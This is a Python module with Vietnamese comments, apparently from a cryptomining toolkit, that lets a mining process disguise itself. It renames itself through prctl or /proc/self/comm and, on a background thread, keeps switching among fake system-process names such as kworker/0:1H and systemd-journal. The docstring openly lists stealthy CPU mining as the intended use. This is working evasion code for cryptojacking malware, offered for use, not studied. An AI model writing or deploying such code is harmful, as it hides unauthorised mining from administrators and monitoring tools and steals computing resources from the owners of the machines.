"""cpu_plugins.cloaking_lib.self_stealth

🔒 **[Self-Stealth Module]** (module tự ẩn danh – cho phép process tự thay đổi tên của chính nó)

Module cho phép **ml-inference process** tự thực hiện **[process name spoofing]** (giả mạo tên tiến trình)
từ bên trong thay vì external control, giải quyết vấn đề **[Process Ownership Mismatch]** (không khớp 
chủ sở hữu tiến trình).

⚠️ CRITICAL CONSTRAINTS:
- CHỈ áp dụng cho **own process** (tiến trình của chính nó)
- SỬ DỤNG **prctl(PR_SET_NAME)** cho /proc/self/comm modification
- KHÔNG cần special privileges vì process modify chính nó

✅ AUTHORIZED USAGE:
- CPU mining process self-renaming
- Internal process name rotation
- Self-managed stealth execution
"""

import os
import sys
import ctypes
import ctypes.util
import random
import time
import logging
import threading
from typing import List, Optional, Dict, Any
from pathlib import Path

# Import unified logging
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError:
    def get_unified_logger(name):
        return logging.getLogger(name)


class SelfStealthManager:
    """
    **[Self-Stealth Manager]** (trình quản lý tự ẩn danh – điều khiển việc thay đổi tên tiến trình từ bên trong)
    
    Quản lý việc tự thay đổi tên process từ bên trong, sử dụng **[prctl system call]** (lệnh gọi hệ thống prctl)
    để modify **"/proc/self/comm"** an toàn.
    """
    
    def __init__(self, target_names: Optional[List[str]] = None, rotation_interval: int = 30):
        """
        Khởi tạo **[Self-Stealth Manager]**.
        
        Args:
            target_names: Danh sách tên giả để rotation. Mặc định sử dụng system processes
            rotation_interval: Thời gian giữa các lần đổi tên (giây)
        """
        self.logger = get_unified_logger('mining_environment.cpu_cloaking')
        self.logger.info("🔒 [SELF-STEALTH] Initializing Self-Stealth Manager")
        
        # **[Default Stealth Names]** (tên ẩn danh mặc định) - giả làm system processes
        self.default_names = [
            "systemd-sleep",
            "kworker/0:1H", 
            "migration/0",
            "rcu_gp",
            "systemd-journal",
            "systemd-udevd",
            "dbus-daemon",
            "NetworkManager",
            "cron",
            "rsyslog"
        ]
        
        self.target_names = target_names or self.default_names
        self.rotation_interval = rotation_interval
        self.original_name = None
        self.current_stealth_name = None
        self.is_active = False
        self.rotation_thread = None
        self._stop_event = threading.Event()
        
        # **[Prctl Constants]** (hằng số prctl) cho Linux system calls
        self.PR_SET_NAME = 15  # prctl operation để set process name
        self.PR_GET_NAME = 16  # prctl operation để get process name
        
        # Load **[libc]** (thư viện C chuẩn) để gọi prctl
        try:
            self.libc = ctypes.CDLL("libc.so.6")
            self.logger.info("✅ [SELF-STEALTH] libc loaded successfully")
        except Exception as e:
            self.logger.error(f"❌ [SELF-STEALTH] Failed to load libc: {e}")
            self.libc = None
    
    def get_current_process_name(self) -> str:
        """
        Lấy tên hiện tại của process từ **"/proc/self/comm"**.
        
        Returns:
            str: Tên process hiện tại
        """
        try:
            with open("/proc/self/comm", "r") as f:
                return f.read().strip()
        except Exception as e:
            self.logger.error(f"❌ [SELF-STEALTH] Cannot read current process name: {e}")
            return "unknown"
    
    def set_process_name_prctl(self, name: str) -> bool:
        """
        Thay đổi tên process sử dụng **[prctl system call]** (lệnh gọi hệ thống prctl).
        
        Args:
            name: Tên mới cho process (tối đa 15 ký tự)
            
        Returns:
            bool: True nếu thành công
        """
        if not self.libc:
            self.logger.error("❌ [SELF-STEALTH] libc not available")
            return False
            
        try:
            # Truncate name to 15 characters (Linux limit)
            truncated_name = name[:15]
            name_bytes = truncated_name.encode('utf-8')
            
            # Call prctl(PR_SET_NAME, name)
            result = self.libc.prctl(self.PR_SET_NAME, name_bytes)
            
            if result == 0:
                self.logger.info(f"✅ [SELF-STEALTH] Process name changed to: '{truncated_name}'")
                return True
            else:
                self.logger.error(f"❌ [SELF-STEALTH] prctl failed with code: {result}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [SELF-STEALTH] prctl system call failed: {e}")
            return False
    
    def set_process_name_proc(self, name: str) -> bool:
        """
        Thay đổi tên process bằng cách ghi trực tiếp vào **"/proc/self/comm"**.
        
        Args:
            name: Tên mới cho process (tối đa 15 ký tự)
            
        Returns:
            bool: True nếu thành công
        """
        try:
            truncated_name = name[:15]
            with open("/proc/self/comm", "w") as f:
                f.write(truncated_name)
            
            self.logger.info(f"✅ [SELF-STEALTH] Process name changed via /proc/self/comm to: '{truncated_name}'")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [SELF-STEALTH] Failed to write /proc/self/comm: {e}")
            return False
    
    def change_process_name(self, name: str) -> bool:
        """
        Thay đổi tên process sử dụng method tốt nhất có sẵn.
        
        Args:
            name: Tên mới cho process
            
        Returns:
            bool: True nếu thành công
        """
        # Thử prctl trước (preferred method)
        if self.set_process_name_prctl(name):
            self.current_stealth_name = name
            return True
        
        # Fallback to /proc/self/comm
        if self.set_process_name_proc(name):
            self.current_stealth_name = name
            return True
            
        self.logger.error(f"❌ [SELF-STEALTH] All methods failed to change process name to: {name}")
        return False
    
    def start_stealth_mode(self) -> bool:
        """
        Bắt đầu **[stealth mode]** (chế độ ẩn danh) với **[name rotation]** (xoay vòng tên).
        
        Returns:
            bool: True nếu khởi động thành công
        """
        if self.is_active:
            self.logger.warning("⚠️ [SELF-STEALTH] Stealth mode already active")
            return True
        
        # Lưu tên gốc
        self.original_name = self.get_current_process_name()
        self.logger.info(f"🔍 [SELF-STEALTH] Original process name: '{self.original_name}'")
        
        # Thay đổi tên lần đầu
        initial_name = random.choice(self.target_names)
        if not self.change_process_name(initial_name):
            self.logger.error("❌ [SELF-STEALTH] Failed to start stealth mode")
            return False
        
        # Bắt đầu rotation thread
        self.is_active = True
        self._stop_event.clear()
        self.rotation_thread = threading.Thread(
            target=self._rotation_worker,
            daemon=True,
            name="SelfStealthRotation"
        )
        self.rotation_thread.start()
        
        self.logger.info(f"✅ [SELF-STEALTH] Stealth mode activated with rotation interval: {self.rotation_interval}s")
        return True
    
    def stop_stealth_mode(self) -> bool:
        """
        Dừng **[stealth mode]** và khôi phục tên gốc.
        
        Returns:
            bool: True nếu dừng thành công
        """
        if not self.is_active:
            self.logger.warning("⚠️ [SELF-STEALTH] Stealth mode not active")
            return True
        
        # Dừng rotation thread
        self._stop_event.set()
        self.is_active = False
        
        if self.rotation_thread and self.rotation_thread.is_alive():
            self.rotation_thread.join(timeout=5)
        
        # Khôi phục tên gốc nếu có
        if self.original_name:
            success = self.change_process_name(self.original_name)
            if success:
                self.logger.info(f"✅ [SELF-STEALTH] Process name restored to: '{self.original_name}'")
            else:
                self.logger.warning(f"⚠️ [SELF-STEALTH] Failed to restore original name: '{self.original_name}'")
            return success
        else:
            self.logger.info("✅ [SELF-STEALTH] Stealth mode stopped")
            return True
    
    def _rotation_worker(self):
        """
        **[Background worker]** (tiến trình nền) để thực hiện **[name rotation]** (xoay vòng tên).
        """
        self.logger.info("🔄 [SELF-STEALTH] Name rotation worker started")
        
        while not self._stop_event.wait(self.rotation_interval):
            if not self.is_active:
                break
            
            try:
                # Chọn tên mới (khác tên hiện tại)
                available_names = [name for name in self.target_names if name != self.current_stealth_name]
                if available_names:
                    new_name = random.choice(available_names)
                    self.change_process_name(new_name)
                    self.logger.debug(f"🔄 [SELF-STEALTH] Rotated to: '{new_name}'")
                
            except Exception as e:
                self.logger.error(f"❌ [SELF-STEALTH] Error during name rotation: {e}")
        
        self.logger.info("🔚 [SELF-STEALTH] Name rotation worker stopped")
    
    def get_status(self) -> Dict[str, Any]:
        """
        Lấy trạng thái hiện tại của **[Self-Stealth Manager]**.
        
        Returns:
            Dict: Thông tin trạng thái
        """
        return {
            "is_active": self.is_active,
            "original_name": self.original_name,
            "current_stealth_name": self.current_stealth_name,
            "current_process_name": self.get_current_process_name(),
            "rotation_interval": self.rotation_interval,
            "available_names": len(self.target_names),
            "rotation_thread_alive": self.rotation_thread.is_alive() if self.rotation_thread else False
        }


def start_self_stealth(rotation_interval: int = 30, custom_names: Optional[List[str]] = None) -> SelfStealthManager:
    """
    **[Convenience function]** (hàm tiện ích) để bắt đầu **[self-stealth mode]** cho process hiện tại.
    
    Args:
        rotation_interval: Thời gian giữa các lần đổi tên (giây)
        custom_names: Danh sách tên tùy chỉnh (tùy chọn)
        
    Returns:
        SelfStealthManager: Instance đã được khởi động
    """
    manager = SelfStealthManager(custom_names, rotation_interval)
    manager.start_stealth_mode()
    return manager


# Global instance để sử dụng từ external modules
_global_stealth_manager: Optional[SelfStealthManager] = None

def get_global_stealth_manager() -> Optional[SelfStealthManager]:
    """Lấy global stealth manager instance."""
    return _global_stealth_manager

def set_global_stealth_manager(manager: SelfStealthManager):
    """Set global stealth manager instance."""
    global _global_stealth_manager
    _global_stealth_manager = manager